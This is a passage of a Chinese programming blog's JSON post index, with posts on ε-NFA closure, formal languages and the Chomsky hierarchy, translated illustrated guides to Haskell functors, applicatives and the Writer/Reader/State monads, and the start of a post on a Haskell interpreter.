{ε}) → 2^Q。 ε-闭包（closure）： 状态 q 的 ε-闭包记为 ε-CLOSURE 或 ECLOSURE，定义为从 q 仅通过 ε 路径可以到达的状态（包括 q 自身）； 状态子集 I 的 ε-闭包：ε-CLOSURE(I) = ∪ ε-CLOSURE(q), q ∈ I； Ia：对状态子集 I ⊆ Q，任意 a ∈ T，Ia = ε-CLOSURE(P), P = δ(I, a)，即 P 是从 I 中状态经过一条标 a 的边可以到达的状态集合。 扩展定义 δ’：Q × T* → 2^Q，对任何 q ∈ Q，有： δ&#39;(q, ε) = ε-CLOSURE(q) δ&#39;(q, ωa) = ε-CLOSURE(P), P = {p | 对某些 r ∈ δ&#39;(q, ω) 且 p ∈ δ(r, a)} δ(q, a) ≠ δ’(q, a)，因为 δ(q, a) 仅表示由 q 出发，仅沿着 一条 标 a 的路径能到达的状态，而 δ’(q, a) 表示经过标 a 或 ε 的路径得到状态集合的 ε-闭包，即 δ&#39;(q, ωa) = ε-CLOSURE(δ( δ&#39;(q, ω), a ))。 有 ε 转换的 NFA 和无 ε 转换的 NFA 等价 ε-NFA 是无 ε 转移的 NFA 的一般情况。设 M = (Q, T, δ, q0, F) 是一个 ε-NFA，可构造一个等价的无 ε 的 NFA：M1 = (Q, T, S1, q0, F1) 对任何 a ∈ T，δ1(q, a) = δ&#39;(q, a)； 若 ε-CLORSURE(q0) ∩ F ≠ ∅，则 F1 = F ∪ {q0}，否则 F1 = F。 构造方法：先确定 F，之后按照 δ1(q, a) = δ&#39;(q, a) 来确定生成式集合。 专栏目录：计算机理论基础此专栏的上一篇文章：形式语言此专栏的下一篇文章：右线性语言 参考资料：《形式语言与自动机》，王柏、杨娟编著，北京邮电大学出版社 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/03/18/formal-languages-and-automata2/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"自动机","slug":"自动机","permalink":"http://forec.github.io/tags/自动机/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"三种实用 Monad","slug":"translation-adit-tum","date":"2017-03-02T10:24:20.000Z","updated":"2017-03-02T12:01:32.000Z","comments":true,"path":"2017/03/02/translation-adit-tum/","link":"","permalink":"http://forec.github.io/2017/03/02/translation-adit-tum/","excerpt":"这篇文章是 Aditya Bhargava 所著 《Three Useful Monads》 的中文译文，已联系原作者取得授权。","text":"这篇文章是 Aditya Bhargava 所著 《Three Useful Monads》 的中文译文，已联系原作者取得授权。 This Article is the Chinese translation for Three Useful Monads (Written by Aditya Bhargava). 英文原文写于 2013 年 6 月 10 日。 引文 在阅读本文之前，你应当了解 Monad 的基本概念，否则请先阅读 《图解 Functor, Applicative 和 Monad》。 下图是函数 half：我们可以将其连续应用多次：12half . half $ 8=&gt; 2 结果与预期一致。现在你决定记录这个函数的执行过程：1half x = (x `div` 2, \"I just halved \" ++ (show x) ++ \"!\") 看起来不错。如果我们想将其连续应用多次，又该怎么书写呢？我们无法直接使用 half . half $ 8，因为应用一次 half 的返回值已经变成了元组，我们无法对元组继续应用 half。下图展示了我们实际期望的功能：显然这个功能不会自己产生，我们必须自己实现：123finalValue = (val2, log1 ++ log2) where (val1, log1) = half 8 (val2, log2) = half val1 但是如果需要记录更多的函数呢？这里存在一个模式：我们希望将每个返回 (Value, Log) 的函数 “串” 到一起。这其实是一种副作用，而 Monad 刚好擅长处理这种副作用！ Writer MonadWriter Monad 非常酷炫。“老铁，让我来处理这波历史记录”，Writer 这么说，“我会帮助你的代码恢复整洁，我还能帮你上天！”（原著这里为 “启动齐柏林飞艇”）。每个 Writer 都包含一个历史记录并回传计算结果。1data Writer w a = Writer &#123; runWriter :: (a, w) &#125; Writer 允许我们这么写代码：1half 8 &gt;&gt;= half 或者你可以用 &lt;=&lt;，它实现了 Monad 版本的函数复合：1half &lt;=&lt; half $ 8 非常接近 half . half $ 8 的写法！一颗赛艇！我们使用 tell 来写入历史记录，用 return 将一个普通的值放入 Writer 的返回值。这是 Writer 版本的 half 函数：1234half :: Int -&gt; Writer String Inthalf x = do tell (\"I just halved \" ++ (show x) ++ \"!\") return (x `div` 2) 新的 half 会回传一个 Writer：runWriter 能帮助我们取出 Writer 封装的元组。12runWriter $ half 8=&gt; (4, \"I just halved 8!\") 然而，真正牛逼的地方在于，我们现在可以用 &gt;&gt;= 把 half 串起来了：12runWriter $ half 8 &gt;&gt;= half=&gt; (2, \"I just halved 8!I just halved 4!\") 下图说明了上面这行代码的原理：我们不需要写任何繁杂的代码，因为 &gt;&gt;= 知道如何将两个 Writer 合并（做 Monad 最重要的是整整齐齐了）！下面是 &gt;&gt;= 针对 Writer 的完整定义：其实这就是我们之前写过的样本代码，不过现在 &gt;&gt;= 帮助我们简化了。别忘了我们还有 return，它将一个值放入 Monad 中，对于 Writer 而言其作用如下图：1return val = Writer (val, \"\") （注意：这些定义 可视作 正确的。实际的 Writer Monad 允许将任何 Monoid 类型作为 “历史记录”，而不仅限于字符串。这里我用字符串简化以帮助你理解。）感谢 Writer Monad ！ Reader Monad假如你想将一些配置传递给许多函数，不妨试试 Reader Monad！Reader Monad 允许你将一个值传递给所有幕后的函数。举个例子：1234greeter :: Reader String Stringgreeter = do name &lt;- ask return (\"hello, \" ++ name ++ \"!\") greeter 回传一个 Reader Monad：下面是 Reader 的定义：1data Reader r a = Reader &#123; runReader :: r -&gt; a &#125; Reader 的唯一字段是一个函数，runReader 可以取出这个函数：现在你可以给这个函数一些输入，它们将会被 greeter 应用：12runReader greeter $ \"adit\"=&gt; \"hello, adit!\" 每当你使用 &gt;&gt;= 都会得到一个 Reader，当你向该 Reader 传入一个状态时，这个状态会被传递给 monad 中的每个函数。1m &gt;&gt;= k = Reader $ \\r -&gt; runReader (k (runReader m r)) r Reader 有些复杂，不过复杂的才是最吼的。return 将一个值放入 Reader ：1return a = Reader $ \\_ -&gt; a ask 将传入的状态回传：1ask = Reader $ \\x -&gt; x 想了解更多关于 Reader 的内容吗？你可以在 这里 看到一个更长的例子（需翻墙）。 State MonadState Monad 是 Reader Monad 最好的朋友：她看起来和 Reader Monad 非常像，只不过它既可读又可写。这是 State 的定义：1State s a = State &#123; runState :: s -&gt; (a, s) &#125; 你可以使用 get 获取状态，也可用 put 改变状态。举个例子：12345678greeter :: State String Stringgreeter = do name &lt;- get put \"tintin\" return (\"hello, \" ++ name ++ \"!\")runState greeter $ \"adit\"=&gt; (\"hello, adit!\", \"tintin\") 没毛病！Reader 就像在说 “你无法改变我”，而 State 则对改变持兹瓷态度。State 和 Reader 的定义看起来非常相似：return：1return a = State $ \\s -&gt; (a, s) &gt;&gt;=：12m &gt;&gt;= k = State $ \\s -&gt; let (a, s') = runState m s in runState (k a) s' 总结Writer、Reader、State。现在你已经将这三个强大的武器添加到你的兵器库了，请不遗余力地使用它们！ 参考资料 Why Monads are useful A good explaination of the Reader monad 英文原文链接： Three Useful Monads （Written by Aditya Bhargava） 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/03/02/translation-adit-tum/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Haskell","slug":"Haskell","permalink":"http://forec.github.io/tags/Haskell/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"图解 Functor, Applicative 和 Monad","slug":"translation-adit-faamip","date":"2017-03-02T06:07:40.000Z","updated":"2017-03-02T11:59:16.000Z","comments":true,"path":"2017/03/02/translation-adit-faamip/","link":"","permalink":"http://forec.github.io/2017/03/02/translation-adit-faamip/","excerpt":"这篇文章是 Aditya Bhargava 所著 《Functors, Applicatives, And Monads In Pictures》 的中文译文，已联系原作者取得授权。另一版本的中文译文由 题叶 翻译，可在此处查看。","text":"这篇文章是 Aditya Bhargava 所著 《Functors, Applicatives, And Monads In Pictures》 的中文译文，已联系原作者取得授权。另一版本的中文译文由 题叶 翻译，可在此处查看。 This Article is the Chinese translation for Functors, Applicatives, And Monads In Pictures (Written by Aditya Bhargava). 英文原文写于 2013 年 4 月 17 日。 引文下图是一个简单的值：将一个函数应用到这个值上：简直 Naive，让我们来扩展一个！假设一个值可以被放到上下文中。你可以把上下文想象成一个盒子，把值放入上下文的过程就如同把东西放到盒子里：现在再把一个函数应用到这个值上，根据不同的上下文，我们将得到不同的结果。这就是 Functor、Applicative、Monad、Arrows 等概念的基础。就 Maybe 这一型别来说，它定义了两种相关联的上下文：马上我们就会看到对 Just a 和 Nothing 应用一个函数的不同之处。在此之前，让我们先了解一下 Functor ! Functors如果一个值被封装在上下文中，你会发现普通函数无法直接对其操作：这时 fmap 就会发挥作用了！fmap 能够和上下文谈笑风生，它对普通函数和被上下文包装的值施了一点魔法，让它们能够愉快相处。举个例子，你想把函数 (+3) 应用到 Just 2 上，那么只需要加上 fmap：12&gt; fmap (+3) (Just 2)Just 5 一颗赛艇！fmap 向我们展示了它的威力！但是 fmap 怎么知道如何应用一个函数呢？ 什么是 FunctorFunctor 是一个 类型类，这是它的定义：任何型别，只要能用 fmap 操作，就是一个 Functor。下面这张图展示了 fmap 各个参数的含义：我们之所以能够执行 fmap (+3) (Just 2) ，是因为 Maybe 也是一个 Functor 。下面的定义指明了 fmap 在面对 Just 和 Nothing 时的处理方式：123instance Functor Maybe where fmap func (Just val) = Just (func val) fmap func Nothing = Nothing 下图说明了执行 fmap (+3) (Just 2) 的整个过程：假设你灵机一动，让 fmap 把 (+3) 应用到 Nothing 上：12&gt; fmap (+3) NothingNothing 就像身经百战的董先森（原文为黑客帝国里的墨菲斯，我也不知作者这么比喻是为啥），fmap 知道自己该做什么：从 Nothing 开始就从 Nothing 结束！这也是 Maybe 类型存在的意义。我们通常使用类似如下的 Python 代码处理数据库：12345post = Post.find_by_id(1)if post: return post.titleelse: return None 用 Haskell 可以写成 fmap (getPostTitle) (findPost 1)。如果 findPost 返回了一篇文章，我们就可以通过 getPostTitle 获取其标题。如果 findPost 返回了 Nothing，我们当然也应该返回 Nothing！是不是很简洁？&lt;$&gt; 是 fmap 的中缀版本，所以写成 getPostTitle &lt;$&gt; (findPost 1) 也是允许的，并且这种写法更常见。 再来看一个例子：把一个函数应用到 List 上会发生什么呢？List 也是 Functor！这是它的定义：12instance Functor [] where fmap = map 我想你应该理解得差不多了，最后一个例子：如果把函数应用到另一个函数上呢，比如 fmap (+3) (+1) ？ 这是一个函数：将某个函数应用到另一个函数：得到的结果是一个新函数！1234&gt; import Control.Applicative&gt; let foo = fmap (+3) (+2)&gt; foo 1015 由此可见，函数同样是 Functor：12instance Functor ((-&gt;) r) where fmap f g = f . g 函数的 fmap 其实就是函数复合。 ApplicativeApplicative 将 Functor 又提高了一个层次。与 Functor 类似，Applicative 中的值也被封装在上下文中：不同之处在于，现在函数也被封装到上下文中：Control.Applicative 定义了 &lt;*&gt;，它知道如何将一个 包装在上下文中的 函数应用到 包装在上下文的 值上。举个例子，Just (+3) &lt;*&gt; Just 2 == Just 5：使用 &lt;*&gt; 会产生很多有趣的情况，看看下面的 List 会发生什么：12&gt; [(*2), (+3)] &lt;*&gt; [1, 2, 3][2, 4, 6, 4, 5, 6] 下面是一些 Applicative 有而 Functor 不具备的功能。如何将一个接收两个参数的函数应用到两个被封装的值呢？1234&gt; (+) &lt;$&gt; (Just 5)Just (+5)&gt; Just (+5) &lt;$&gt; (Just 4)ERROR ??? WHAT DOES THIS EVEN MEAN WHY IS THE FUNCTION WRAPPED IN A JUST Applicative：1234&gt; (+) &lt;$&gt; (Just 5)Just (+5)&gt; Just (+5) &lt;*&gt; (Just 3)Just 8 Applicative 把 Functor 丢到了一边。“我今天就教你们一点人生经验”，Applicative 如是说，“在装备了 &lt;$&gt; 和 &lt;*&gt; 后，我可以接受任何函数，之后我把对应的封装值喂给它们，最后我就得到了一个封装好的值！哈哈哈哈哈！”12&gt; (*) &lt;$&gt; Just 5 &lt;*&gt; Just 3Just 15 对了，这种模式可以用 liftA2 简化：12&gt; liftA2 (*) (Just 5) (Just 3)Just 15 Monad如何学习 Monad： 在计算机科学专业取得博士学位。 不学。因为这一节你根本用不到它！ Functor 将一个普通函数应用到被封装的值上：Applicative 将一个封装的函数应用到封装值上：Monad 将一个 “接受一个普通值并回传一个被封装的值” 的函数应用到一个被封装的值上，这一任务由函数 &gt;&gt;= （读作 “bind”）完成。听起来似乎很拗口，让我们来看个例子吧，还是熟悉的 Maybe：假设 half 是只对偶数感兴趣的函数：123half x = if even x then Just (x `div` 2) else Nothing 如果给 half 一个被封装的值会怎样？这时我们需要用 &gt;&gt;= 把被封装的值挤到 half 中。看看 &gt;&gt;= 的照片：再看看它的效果：123456&gt; Just 3 &gt;&gt;= halfNothing&gt; Just 4 &gt;&gt;= halfJust 2&gt; Nothing &gt;&gt;= halfNothing 这其中究竟发生了什么？Monad 是另一种类型类，这是它定义的一部分：12class Monad m where (&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b 下图展示了 &gt;&gt;= 各个参数的意义：下面的定义让 Maybe 成为了 Monad：123instance Monad Maybe where Nothing &gt;&gt;= func = Nothing Just val &gt;&gt;= func = func val 来看看执行 Just 3 &gt;&gt;= half 时发生了什么：如果传入 Nothing 就更容易了：这些调用过程还可以被连起来，比如执行 Just 20 &gt;&gt;= half &gt;&gt;= half &gt;&gt;= half 会得到 Nothing：流弊！现在我们知道，Maybe 既是 Functor，又是 Applicative，还是 Monad。 再来看另一个例子：IO Monad。 介绍三个函数先。 getLine 不接受参数并获取用户输入（getLine :: IO String）： readFile 接受一个字符串（文件路径）并返回文件的内容（readFile :: FilePath -&gt; IO String，FilePath 是 String 的别名）： putStrLn 接受一个字符串并打印它（putStrLn :: String -&gt; IO ()）： 这三个函数都接受一个正常的值（或者不接受值）并且回传一个被封装在 IO Monad 中的值。我们可以用 &gt;&gt;= 把它们串起来！1getLine &gt;&gt;= readFile &gt;&gt;= putStrLn Haskell 还为我们提供了 do，它是 Monad 的语法糖：1234foo = do filename &lt;- getLine contents &lt;- readFile filename putStrLn contents 总结 实现了 Functor 类型类的数据类型被称为 functor。 实现了 Applicative 类型类的数据类型被称为 applicative。 实现了 Monad 类型类的数据类型被称为 monad。 Maybe 实现了这三种类型类，所以它同时是 functor、applicative 和 monad。 它们三个之间的区别是什么呢？ functors ：使用 fmap 或 &lt;$&gt; 把一个普通函数应用到被封装的值上 applicatives ：使用 &lt;*&gt; 或 liftA 把一个被封装的函数应用到被封装的值上 monads ：使用 &gt;&gt;= 或 liftM 把一个接受普通值、回传封装值的函数应用到一个被封装的值上 亲爱的朋友（我觉得我们算是朋友了），现在你是否觉得 monad 是一个简单并聪明的概念呢？既然你已经读完了这篇 “科普文”，不如进一步了解一下 monad：LYAH 编写的 Monad 章节 中包含了许多我在本文中忽略的信息，他写的非常棒，我就不在此赘述了。 更多与 Monad 相关的图文介绍，请看 三种实用 monad。 英文原文链接： Functors, Applicatives, And Monads In Pictures （Written by Aditya Bhargava） 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/03/02/translation-adit-faamip/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Haskell","slug":"Haskell","permalink":"http://forec.github.io/tags/Haskell/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"来看几种基本 Monad","slug":"talk-about-some-simple-monads","date":"2017-03-01T13:52:16.000Z","updated":"2017-03-01T15:45:28.000Z","comments":true,"path":"2017/03/01/talk-about-some-simple-monads/","link":"","permalink":"http://forec.github.io/2017/03/01/talk-about-some-simple-monads/","excerpt":"@Fallenwood 选修的 《Foundations of Programming Languages》 课程让我看的很手痒。整理一下基本的 Typeclass 和 Monad，准备跟随贵科步伐重新学习 Haskell。","text":"@Fallenwood 选修的 《Foundations of Programming Languages》 课程让我看的很手痒。整理一下基本的 Typeclass 和 Monad，准备跟随贵科步伐重新学习 Haskell。 只做整理不做总结，绝不写任何有关自己对 Monad 的理解。 基本 TypeclassFunctor Functor （Data.Functor）类型类表明型别可以被 map ，类型类声明为： 12class Functor f where fmap :: (a -&gt; b) -&gt; f a -&gt; f b Functor 类型类定义中 f 的 kind 是 * -&gt; *；&lt;$&gt; 是 fmap 的语法糖。 Functor 类型类需要遵守以下守则： fmap id = id fmap (f . g) = fmap f . fmap g Applicative Applicative （Control.Applicative）算是 Functor 的加强版，将一个 “包装” 在某个抽象型别中的函数应用到对应型别的值中，类型类声明为： 12345class (Functor f) =&gt; Applicative f where pure :: a -&gt; f a (&lt;*&gt;) :: f (a -&gt; b) -&gt; f a -&gt; f b (&lt;*) :: f a -&gt; f b -&gt; f a (*&gt;) :: f a -&gt; f b -&gt; f b Applicative 类型类中定义的型别 f 必须也是 Functor 类型类的实例。pure 函数将值包装到 Applicative Functor 中。&lt;* 和 *&gt; 函数均有默认实现。 对于一个纯粹的函数 func :: a -&gt; b，可以通过 fmap 将其作用到一个 Functor 类型类上，也可以通过 pure 将 func 提升到 Applicative Functor 中，再利用 &lt;*&gt; 将其运用到该类型类包装的值上。例如，pure (+) &lt;*&gt; (Just 2) &lt;*&gt; (Just 3) 的结果是 Just 5。可以利用 &lt;$&gt; 这一语法糖简化为 (+) &lt;$&gt; (Just 2) &lt;*&gt; (Just 3)。 Applicative 类型类需要遵守如下守则（必然也满足 Functor Laws）： pure f &lt;*&gt; x = fmap f x pure id &lt;*&gt; x = x pure (.) &lt;*&gt; u &lt;*&gt; v &lt;*&gt; w = u &lt;*&gt; (v &lt;*&gt; w) pure f &lt;*&gt; pure x = pure (f x) u &lt;*&gt; pure y = pure ($ y) &lt;*&gt; u Monoid Monoid （Data.Monoid）类型类的定义如下，它对应实例的型别 m 的 kind 是 *： 12345class Monoid m where mempty :: m mappend :: m -&gt; m -&gt; m mconcat :: [m] -&gt; m mconcat = foldr mappend mempty Monoid 指群论中的半群，其需满足封闭性和右结合律。Monoid 的名字看起来像是 mono 和 id 的组合，即 “单幺元”。这里的 mempty 和下面 MonadPlus 中的 mzero 均为幺元。 几种常见的 Monoid 如： List、Any、All、Sum、Product、Ordering、Maybe 等。 Monoid 需要遵守如下守则： mappend mempty x = x mappend x mempty = x mappend (mappend x y) z = mappend x (mappend y z) Monoid 也应用在 Foldable 类型类的 foldMap 函数中。foldMap 的型别声明为 (Foldable t, Monoid m) =&gt; (a -&gt; m) -&gt; t a -&gt; m。可以为自定义类型实作 Foldable 类型类，即可通过 foldMap 对自定义类型的元素做 map over、折叠等操作。注意 foldMap 和 fmap 的区别在于 foldMap 不会将函数返回值再次包装到原类型类中，而是包装到 Monoid 中。举个例子，对于自定义类型 data Tree a = Node a (Tree a) (Tree a) | Empty，要想确定树中有无小于 0 的元素，只需 getAny $ foldMap (\\x -&gt; Any $ x &lt; 0) tree，这里 foldMap 把树中每个元素映射到 Any Monoid 中。 Monad Monad （Control.Monad）类型类定义如下： 1234567class Applicative m =&gt; Monad m where (&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b (&gt;&gt;) :: m a -&gt; m b -&gt; m b x &gt;&gt; y = x &gt;&gt;= \\_ -&gt; y return :: a -&gt; m a fail :: String -&gt; m a fail msg = error msg Monad 的实例本身必须是 Applicative 的实例。其类型类定义中已经默认实现了 &gt;&gt; 和 fail，定义实例时可以重写这些函数，也可以只实现 return 和 &gt;&gt;=。return 等价于 pure。 语法 do 可帮助把一些 Monad 操作连接在一起，其包裹的代码的每一行均为一个 Monad 实例的值。 List 的 Monad 实例定义如下： 1234instance Monad [] where return x = [x] xs &gt;&gt;= f = concat (map f xs) fail _ = [] 从 List 实例定义可看出，&gt;&gt;= 类似过程式语言中的循环嵌套，即将 &gt;&gt;= 左侧的 List 中的每个元素依次应用到右侧的函数上。List Comprehension 仅仅是它的语法糖，如 [x | x &lt;- [1..10], xmod3 == 0] 等价于 [1..10] &gt;&gt;= \\x -&gt; if xmod3 == 0 then [x] else []。 Monad 需要遵守如下守则： return x &gt;&gt;= f = f x m &gt;&gt;= return = m (m &gt;&gt;= f) &gt;&gt;= g = m &gt;&gt;= (\\x -&gt; f x &gt;&gt;= g) MonadPlus 上面的 List Comprehension 也等价于 [1..10] &gt;&gt;= \\x -&gt; guard (xmod3 == 0) &gt;&gt; return x。这需要用到 MonadPlus 类型类，它指同时表现为 Monoid 的 Monad，其定义为： 123class Monad m =&gt; MonadPlus m where mzero :: m a mplus :: m a -&gt; m a -&gt; m a mzero 等价于 mempty，mplus 等价于 mappend。 guard 函数的定义如下。当 guard 监察的 Bool 变量为 True 时，return 会返回一个空 unit，否则 在 List Comprehension 例子中，mzero = [] 不会产生任何结果。 123guard :: (MonadPlus m) =&gt; Bool -&gt; m ()guard True = return ()guard False = mzero 常用 MonadWriter Writer （Control.Monad.Writer）的定义和 Monad 实例定义如下，该模块并未导出其值构造子。 12345newtype Writer w a = Writer &#123; runWriter :: (a, w) &#125;instance (Monoid w) =&gt; Monad (Writer w) where return x = Writer (x, mempty) (Writer (x, v)) &gt;&gt;= f = let Writer (y, v') = f x in Writer (y, v `mappend` v') 可用 tell 向 Writer 加入 log。 ((-&gt;) r) 函数也是 Monad，其实例为： 123instance Monad ((-&gt;) r) where return = const g &gt;&gt;= f = \\v -&gt; f (g v) v Reader Reader （对函数 Monad 的一种包装）： 12345newtype Reader s a = Reader&#123; runReader :: s -&gt; a &#125;instance Monad (Reader s) where return x = Reader (const x) m &gt;&gt;= k = Reader $ \\r -&gt; runReader (k (runReader m r)) r State State （Control.Monad.State）常用来表示状态迁移，代表了改变状态的操作： 1234567newtype State s a = State&#123;runState :: s -&gt; (a, s)&#125;instance Monad (State s) where return x = State $ \\s -&gt; (x, s) (State h) &gt;&gt;= f = State $ \\s -&gt; let (a, newState) = h s (State g) = f a in g newState 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/03/01/talk-about-some-simple-monads/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Haskell","slug":"Haskell","permalink":"http://forec.github.io/tags/Haskell/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"形式语言","slug":"formal-languages-and-automata1","date":"2017-02-25T15:33:13.000Z","updated":"2017-03-19T15:00:34.000Z","comments":true,"path":"2017/02/25/formal-languages-and-automata1/","link":"","permalink":"http://forec.github.io/2017/02/25/formal-languages-and-automata1/","excerpt":"这个寒假遇到的一些问题让我想起之前形式语言与自动机的内容，程序执行的本质是状态的变化，我觉得有必要将这部分理论捡起来，需要的时候方便自己回忆。","text":"这个寒假遇到的一些问题让我想起之前形式语言与自动机的内容，程序执行的本质是状态的变化，我觉得有必要将这部分理论捡起来，需要的时候方便自己回忆。 概念整理 形式语言 是形式化描述的 字母表 上的 字符串 的集合。字母表 为字符的有限集合，多用 T 表示；字符串 指字母表中的字符构成的 有限 序列。 自动机 接受一定的输入，执行一定的动作，产生一定的结果。使用状态迁移描述整个过程。例如可实现一个用于识别字符串的自动机系统，根据输入的字符串解析形式语言。状态 是一个标识，用于区分自动机在不同时刻的状况；自动机的本质是 根据状态、输入和规则决定下一个状态 （状态迁移）。 有限自动机可以认为是由一个带有读写头的有限控制器和一条写有字符的输入带组成。 关系：形式语言非限定性语言上下文有关语言上下文无关语言正则语言自动机图灵机线性有界自动机下推式存储自动机有限自动机 语言及文法 字符串的运算：字符串 ω 的长度记为 |ω|， ω 的逆记为 ω^T。字符串的 连接 满足结合律，且有 εω = ωε = ω，|ω1ω2| = |ω1| + |ω2|。空串 ε 是任何串的前/后缀和字串。 字母表的 幂运算：设 T 为字母表，n∈N。 T0 = {ε} 设 x∈T(n-1)，a∈T，则 ax∈Tn Tn 中的元素只能由 (1) 和 (2) 构成 闭包（*）：T* = Σ Tk (k = 0..n) = T0 ∪ T1 ∪ ... ∪ Tn，闭包（+）：T+ = Σ Tk (k = 1..n)，即 T* = T+ ∪ {ε}。 语言：T 为字母表，任何集合 L ⊆ T* 是字母表 T 上的一个语言。 积运算：L1 与 L2 的积是 L1 和 L2 中字符串相连的集合，不满足交换律 幂运算：L0 = {ε}, Ln = L · L(n-1) = L(n-1) · L (n ≥ 1) ∅ 表示不存在任何句子的语言，{ε} 表示仅存在空句子的语言 文法：用来定义语言的数学模型称为文法。 语言 L 为有限集合：通过列举表示 语言 L 为无限集合，通过文法产生系统或机器识别系统 元语言：描述语言的语言，文法是一种元语言 BNF（巴科斯范式）： 123&lt;数字&gt; ::= 0 | 1 | 2 | .. | 9&lt;字母&gt; ::= A | B | C | .. | Z | a | b | c | .. | z&lt;标识符&gt; ::= &lt;字母&gt; | &lt;标识符&gt;&lt;字母&gt; | &lt;标识符&gt;&lt;数字&gt; Chomsky 文法体系：任何一种文法必包含有：两个不同的有限符号集合（终结符号集合 N 和非终结符号集合 T）；一个形式化规则的有限集合 P （又称生成式集合）；一个起始符 S。 文法的 形式定义 ：文法 G 是一个四元组，G = (N, T, P, S)。其中 N ∩ T = ∅；P 为形式为 α → β 的生成式 有限 集合，且 α ∈ (N∪T)* N+ (N∪T)*，β ∈ (N∪T)*；S 是起始符，S ∈ N。 推导和句型 直接推导：G = (N, T, P, S)，有 A → β 是 P 中的生成式，α 和 γ 均属于 (N ∪ T)*，则 αAγ ⇒ αβγ 称 αAγ 直接导出 αβγ，或者说 αβγ 是 αAγ 的直接推导； 推导序列：α = α0 ⇒ α1 ⇒ ... ⇒ αn 是长度为 n 的推导序列，α = α0 是长度为 0 的推导序列。对 α 推导出 α’，记为 α ⇒(*, G) α&#39;，若 α 推导出 α’ 用了长度大于 0 的推导序列，则记为 α ⇒(+, G) α&#39;。推导序列的每一步都会产生一个字符串，这些字符串称为 句型。 字符串 α 是文法 G 的句型，当且仅当 S ⇒(*, G) α，且 α ∈ (N ∪ T)*。句型包含 句子，ω 是 G 的句子，当且仅当 S ⇒(*, G) ω 且 ω ∈ T*，即必须由起始符集合 S 推导出，并且由终结符集合构成的。 例：括号匹配语言，定义集合基本元素 ()，递归产生其他句子：若 S 为合法串，则 (S) 和 SS 均合法。故 P 中包含三种生成式：S → (); S → (S); S → SS。 Chomsky 文法体系分类 0 型文法：无限制文法 ⇒ 无限制语言，递归可枚举语言（图灵机） 1 型文法：上下文有关文法，CSG ⇒ 上下文有关语言，CSL（线性有界自动机，LBA） 生成式形式：α → β，其中 |α| ≤ |β|, β ∈ (N ∪ T)+, α ∈ (N ∪ T)* N+ (N ∪ T)*，即满足生成式的 左侧短于右侧 ，且 不包含 A → ε 。 应用：过程式语言调用时形参与实参的一致性检查。 2 型文法：上下文无关文法，CFG ⇒ 上下文无关语言，CEL（下推自动机，PDA） 生成式形式：A → B，其中 A ∈ N, β ∈ (N ∪ T)*，可以包含 A → ε。 每个生成式左侧都是 单个非终结符。 3 型文法：正则文法 ⇒ 正则语言（有限自动机，FSA） 左线性文法：A → Bω 或 A → ω，其中 A, B ∈ N, ω ∈ T*； 右线性文法：A → ωB 或 A → ω，其中 A, B ∈ N, ω ∈ T*。 已知语言求特定文法，得到的文法不是唯一的。 几种文法之间关系： 0 型：无限制，包括 1、2、3 型文法； 1 型：不允许 A → ε，包含不含 A → ε 的 2、3 型文法 2 型：包含 3 型文法 专栏目录：计算机理论基础此专栏的上一篇文章：无此专栏的下一篇文章：有限自动机 参考资料：《形式语言与自动机》，王柏、杨娟编著，北京邮电大学出版社 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/02/25/formal-languages-and-automata1/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"自动机","slug":"自动机","permalink":"http://forec.github.io/tags/自动机/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"用 Haskell 实现解释器","slug":"talk-about-interpreter","date":"2017-02-14T12:38:16.000Z","updated":"2017-02-15T12:10:56.000Z","comments":true,"path":"2017/02/14/talk-about-interpreter/","link":"","permalink":"http://forec.github.io/2017/02/14/talk-about-interpreter/","excerpt":"这篇文章主要基于王垠早年发过的文章《怎样写一个解释器》，我参考了 Racket 版本的 R2 解释器，并用 Haskell 实现 H2Lang 的简单解释器，较 R2 的功能做了一点改进。","text":"这篇文章主要基于王垠早年发过的文章《怎样写一个解释器》，我参考了 Racket 版本的 R2 解释器，并用 Haskell 实现 H2Lang 的简单解释器，较 R2 的功能做了一点改进。 代码的表示 王垠的 R2 解释器用 Racket 实现，Racket 可以很容易地用 &#39;(op e1 e1) 的形式表示 S-expr，并且 lambda 表达式也可以复用。Fallenwood 也用 Python 实现了一个类似的 Lisp 解释器，他将操作符和表达式均以列表的形式存储，利用了 Python 的动态类型。知乎上 “如何写 Lisp 解释器” 这个问题下，答主 Belleve 给出了 JS 实现的 Lisp 解释器，并实现了 call/cc。 Haskell 是静态类型，没法把动态类型列表迭代那一套搬过来，因此基本思路和王垠文章中所述类似。为了方便起见，我声明新的类型，并用字符串表示值操作符： 1234567891011data Exp = Value 